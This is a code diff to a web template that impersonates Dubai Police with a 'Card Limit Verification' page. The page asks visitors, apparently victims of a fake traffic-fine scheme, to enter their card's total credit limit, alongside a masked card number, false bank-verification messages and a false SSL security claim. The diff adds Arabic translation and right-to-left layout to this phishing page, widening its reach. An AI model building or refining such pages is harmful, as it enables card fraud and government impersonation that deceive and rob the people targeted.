@@ -5,10 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <title>Card Verification | Dubai Police</title>
 <link rel="icon" type="image/png" href="/dp-logo.png">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
 body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;max-width:480px;margin:0 auto;}
+[dir="rtl"] body{font-family:'Cairo','Inter',sans-serif;}
 @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 @keyframes spin{to{transform:rotate(360deg)}}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
@@ -22,9 +23,12 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
 .notice-box{margin:16px 20px 0;padding:12px 14px;background:#fffbeb;border:1.5px solid #fde68a;border-radius:10px;font-size:12px;color:#92400e;line-height:1.55;}
 .form-section{padding:18px 20px 20px;}
 .form-label{font-size:12px;font-weight:700;color:#374151;margin-bottom:8px;display:block;}
+[dir="rtl"] .form-label{text-align:right;}
 .amount-input-wrap{position:relative;}
 .amount-prefix{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:14px;font-weight:700;color:#6b7280;pointer-events:none;}
+[dir="rtl"] .amount-prefix{left:auto;right:14px;}
 .amount-input{width:100%;padding:14px 14px 14px 58px;border:2px solid #e5e7eb;border-radius:12px;font-size:20px;font-weight:700;color:#0f172a;background:#fafafa;outline:none;font-family:'Inter',monospace;transition:border-color .15s;letter-spacing:1px;}
+[dir="rtl"] .amount-input{padding:14px 58px 14px 14px;}
 .amount-input:focus{border-color:#1a6b3a;background:white;box-shadow:0 0 0 3px rgba(26,107,58,.1);}
 .btn-submit{width:100%;padding:14px;background:linear-gradient(135deg,#1a6b3a,#0f4a27);color:white;font-size:15px;font-weight:700;border:none;border-radius:50px;cursor:pointer;box-shadow:0 4px 16px rgba(26,107,58,.35);transition:all .15s;font-family:inherit;margin-top:14px;display:flex;align-items:center;justify-content:center;gap:8px;}
 .btn-submit:disabled{background:#9ca3af;box-shadow:none;cursor:not-allowed;}
@@ -44,7 +48,10 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
       <div style="color:rgba(255,255,255,0.6);font-size:11px;">شرطة دبي</div>
     </div>
   </div>
-  <div style="font-size:11px;color:rgba(255,255,255,0.5);">Secure Verification</div>
+  <div style="display:flex;align-items:center;gap:8px;">
+    <div style="font-size:11px;color:rgba(255,255,255,0.5);" data-i18n="secure_payment">Secure Verification</div>
+    <button id="lang-toggle" onclick="dpI18n.setLang(dpI18n.getLang()==='ar'?'en':'ar')" style="font-size:12px;font-weight:700;padding:4px 11px;border-radius:16px;border:1.5px solid rgba(255,255,255,0.45);background:rgba(255,255,255,0.12);color:white;cursor:pointer;">AR</button>
+  </div>
 </header>
 
 <div class="main">
@@ -57,7 +64,7 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
           <polyline points="9 12 11 14 15 10"/>
         </svg>
       </div>
-      <div class="card-title">Card Limit Verification</div>
+      <div class="card-title" data-i18n="card_limit_title">Card Limit Verification</div>
       <div class="card-sub">To authorize this transaction, your bank requires verification of your card's total credit limit.</div>
     </div>
 
@@ -66,35 +73,36 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
     </div>
 
     <div class="form-section" id="form-section">
-      <label class="form-label">Your Card's Total Credit Limit (AED)</label>
+      <label class="form-label" data-i18n="card_limit_label">Your Card's Total Credit Limit (AED)</label>
       <div class="amount-input-wrap">
         <span class="amount-prefix">AED</span>
         <input type="text" inputmode="numeric" id="limit-input" class="amount-input" placeholder="0" oninput="onLimitInput(this.value)" autocomplete="off">
       </div>
       <button class="btn-submit" id="submit-btn" onclick="submitLimit()" disabled>
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-        Confirm Limit
+        <span data-i18n="confirm_limit">Confirm Limit</span>
       </button>
       <div class="status-bar" id="status-bar" style="display:none;">
         <div class="s-dot"></div>
-        <span id="status-txt">Verifying with bank…</span>
+        <span id="status-txt" data-i18n="verifying">Verifying with bank…</span>
       </div>
     </div>
 
     <div style="padding:0 20px 16px;">
       <div style="display:flex;gap:10px;padding:12px 14px;background:#f8faf9;border-radius:10px;align-items:flex-start;">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6b7280" stroke-width="2" stroke-linecap="round" style="flex-shrink:0;margin-top:1px;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12.01" y2="8"/><line x1="12" y1="12" x2="12" y2="16"/></svg>
-        <div style="font-size:11px;color:#6b7280;line-height:1.55;">Card: <strong>•••• •••• •••• <%= cardLast4 %></strong>&nbsp;&nbsp;Amount: <strong>AED <%= totalFine.toLocaleString() %></strong></div>
+        <div style="font-size:11px;color:#6b7280;line-height:1.55;"><span data-i18n="card">Card</span>: <strong>•••• •••• •••• <%= cardLast4 %></strong>&nbsp;&nbsp;<span data-i18n="amount">Amount</span>: <strong>AED <%= totalFine.toLocaleString() %></strong></div>
       </div>
     </div>
 
     <div class="foot">
       <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Secured by 256-bit SSL encryption
+      <span data-i18n="ssl">Secured by 256-bit SSL encryption</span>
     </div>
   </div>
 </div>
 
+<script src="/js/i18n.js"></script>
 <script>
 const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
 const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
@@ -125,7 +133,8 @@ async function submitLimit() {
     });
   } catch {}
 
-  document.getElementById('status-txt').textContent = 'Waiting for bank confirmation…';
+  const stEl = document.getElementById('status-txt');
+  if (stEl) stEl.textContent = window.dpI18n ? window.dpI18n.t('waiting_approval') : 'Waiting for bank confirmation…';
 }
 
 if (SID) {
